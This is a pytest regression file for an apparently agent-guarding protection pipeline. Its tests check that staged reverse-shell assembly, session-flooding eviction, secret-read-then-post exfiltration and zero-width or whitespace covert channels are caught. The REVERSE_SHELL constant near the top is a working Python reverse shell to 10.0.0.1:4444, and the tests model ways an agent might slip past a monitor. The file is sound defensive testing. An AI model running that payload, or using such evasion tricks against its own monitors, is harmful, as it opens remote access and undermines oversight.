"""Regressions from the verification of commit 81e1fd1, driven through the real boundary."""

from __future__ import annotations

import threading

import pytest

from panoptis.protect import ActionBlocked, ProtectionConfig, ProtectionPipeline, ToolAction
from panoptis.protect.enforce import enforce_call
from panoptis.protect.ltl_trajectory import LTLTrajectoryVerifier
from panoptis.protect.stego_neutralizer import StegoNeutralizer

REVERSE_SHELL = (
    "import socket, subprocess\n"
    "s = socket.socket(); s.connect(('10.0.0.1', 4444))\n"
    "subprocess.Popen(['/bin/sh'], stdin=s.fileno(), stdout=s.fileno())\n"
)
ORDINARY_CODE = (
    "import subprocess\nimport requests\n\n"
    "def deploy():\n    subprocess.run(['git', 'status'], check=True)\n"
    "    return requests.get('https://example.com').status_code\n"
)


def _call(pipeline, tool, arguments, *, session="s", tenant="default"):
    seen: dict = {}

    def invoke(args):
        seen["args"] = args
        return "ok"

    action = ToolAction(
        tool=tool, arguments=arguments, session_id=session, tenant_id=tenant, agent_id="agent"
    )
    enforce_call(pipeline, action, invoke)
    return seen["args"]


def _trajectory_pipeline() -> ProtectionPipeline:
    return ProtectionPipeline(config=ProtectionConfig(enable_ltl_trajectory=True))


def _stego_pipeline() -> ProtectionPipeline:
    return ProtectionPipeline(config=ProtectionConfig(enable_stego_neutralizer=True))


def test_ordinary_code_using_subprocess_and_requests_can_be_tested():
    p = _trajectory_pipeline()
    _call(p, "write_file", {"path": "tools.py", "content": ORDINARY_CODE})
    _call(p, "bash", {"command": "pytest -q"})


def test_a_file_overwritten_with_clean_content_no_longer_blocks():
    p = _trajectory_pipeline()
    _call(p, "write_file", {"path": "util.py", "content": REVERSE_SHELL})
    _call(p, "write_file", {"path": "util.py", "content": "print('clean')\n"})
    _call(p, "bash", {"command": "python util.py"})


def test_assembly_through_shell_redirection_is_blocked():
    p = _trajectory_pipeline()
    _call(p, "bash", {"command": "echo 'import socket, subprocess' > rev.py"})
    _call(p, "bash", {"command": "echo 's = socket.socket()' >> rev.py"})
    with pytest.raises(ActionBlocked) as blocked:
        _call(p, "bash", {"command": "python3 rev.py"})
    assert "LTL_WORKFLOW_LEVEL_JAILBREAK_DETECTED" in {
        f.code for f in blocked.value.decision.findings
    }


@pytest.mark.parametrize("tool", ["terminal", "execute_command", "some_new_runner"])
def test_any_tool_handed_a_command_counts_as_execution(tool):
    p = _trajectory_pipeline()
    _call(p, "write_file", {"path": "rev.py", "content": REVERSE_SHELL})
    with pytest.raises(ActionBlocked):
        _call(p, tool, {"command": "python rev.py"})


def test_an_indicator_split_across_two_appends_is_still_seen():
    p = _trajectory_pipeline()
    _call(p, "write_file", {"path": "rev.py", "content": "import subprocess\ns = socket.so"})
    _call(p, "append_file", {"path": "rev.py", "content": "cket()\n"})
    with pytest.raises(ActionBlocked):
        _call(p, "bash", {"command": "python rev.py"})


def test_flooding_other_sessions_cannot_evict_a_dangerous_session():
    p = _trajectory_pipeline()
    p.ltl.max_sessions = 20
    _call(p, "write_file", {"path": "rev.py", "content": REVERSE_SHELL}, session="victim")
    for i in range(60):
        _call(p, "write_file", {"path": "notes.txt", "content": "hello"}, session=f"flood-{i}")
    with pytest.raises(ActionBlocked):
        _call(p, "bash", {"command": "python rev.py"}, session="victim")


def test_when_only_dangerous_sessions_remain_the_oldest_is_sealed_and_fails_closed():
    ltl = LTLTrajectoryVerifier(max_facts_per_tenant=2)

    def write(session):
        ltl.record_step(
            ToolAction(
                tool="write_file",
                arguments={"path": "r.py", "content": REVERSE_SHELL},
                session_id=session,
                tenant_id="t",
                agent_id="a",
            )
        )

    write("a")
    write("b")
    write("c")  # no room: the oldest session gives up its exact facts

    def run(session):
        action = ToolAction(
            tool="bash",
            arguments={"command": "ls"},
            session_id=session,
            tenant_id="t",
            agent_id="a",
        )
        return {f.code for f in ltl.verify_action(action)}

    assert "LTL_STATE_OVERFLOW" in run("a")
    assert "LTL_WORKFLOW_LEVEL_JAILBREAK_DETECTED" in run("a")
    assert "LTL_WORKFLOW_LEVEL_JAILBREAK_DETECTED" in run("c")
    assert {"t/b", "t/c"} == set(ltl.modified_files)


def test_a_long_session_stays_bounded_and_keeps_its_sticky_facts():
    ltl = LTLTrajectoryVerifier(max_steps_per_session=100)
    base = {"session_id": "s", "tenant_id": "t", "agent_id": "a"}
    ltl.record_step(ToolAction(tool="read_file", arguments={"path": ".env"}, **base))
    for _ in range(5_000):
        ltl.record_step(
            ToolAction(
                tool="write_file",
                arguments={"path": "n", "content": "y" * 500 + "socket.so"},
                **base,
            )
        )
    assert len(ltl.traces["t/s"]) <= 100
    assert len(ltl.modified_files["t/s"]["n"].tail) <= 12
    egress = ToolAction(tool="http_post", arguments={"url": "https://x.test"}, **base)
    assert "LTL_MULTI_HOP_EXFILTRATION_DETECTED" in {f.code for f in ltl.verify_action(egress)}


def test_the_verifier_survives_concurrent_sessions_under_eviction():
    ltl = LTLTrajectoryVerifier(max_sessions=10)
    errors: list[BaseException] = []

    def worker(n: int) -> None:
        try:
            for i in range(300):
                base = {"session_id": f"s{(n * 7 + i) % 40}", "tenant_id": "t", "agent_id": "a"}
                ltl.record_step(
                    ToolAction(tool="write_file", arguments={"path": "f", "content": "x"}, **base)
                )
                ltl.verify_action(ToolAction(tool="bash", arguments={"command": "ls"}, **base))
        except BaseException as exc:  # noqa: BLE001 - reported by the assertion below
            errors.append(exc)

    threads = [threading.Thread(target=worker, args=(n,)) for n in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert not errors
    assert len(ltl.traces) <= 10


@pytest.mark.parametrize(
    "content",
    [
        "Line one  \nLine two\n",  # Markdown hard line break
        "E = mc²\nTemp 25℃, ﬁle, ＡＢ\n",  # compatibility characters
        "family: \U0001f468‍\U0001f469‍\U0001f467\n",  # ZWJ emoji sequence
        "می‌خواهم\n",  # Persian word with ZWNJ
        "\U0001f3f4\U000e0067\U000e0062\U000e0073\U000e0063\U000e0074\U000e007f\n",  # flag of Scotland
    ],
)
def test_legitimate_content_reaches_the_tool_unchanged(content):
    got = _call(_stego_pipeline(), "write_file", {"path": "notes.md", "content": content})
    assert got["content"] == content


def test_covert_channels_are_still_removed_at_the_execution_boundary():
    p = _stego_pipeline()
    assert (
        _call(p, "write_file", {"path": "a", "content": "x = 1 \t \ny\t\t\n"})["content"]
        == "x = 1\ny\n"
    )
    assert (
        _call(p, "write_file", {"path": "b", "content": "hi​there\U000e0041"})["content"]
        == "hithere"
    )
    assert _call(p, "write_file", {"path": "c", "content": "a‍b"})["content"] == "ab"


def test_mixed_key_dicts_and_tuples_survive_neutralization():
    cleaned = StegoNeutralizer().neutralize({1: "a", "b": ("x ",)}).cleaned_payload
    assert cleaned == {1: "a", "b": ("x",)}
    _call(_stego_pipeline(), "lookup", {"table": {1: "a", "b": 2}})
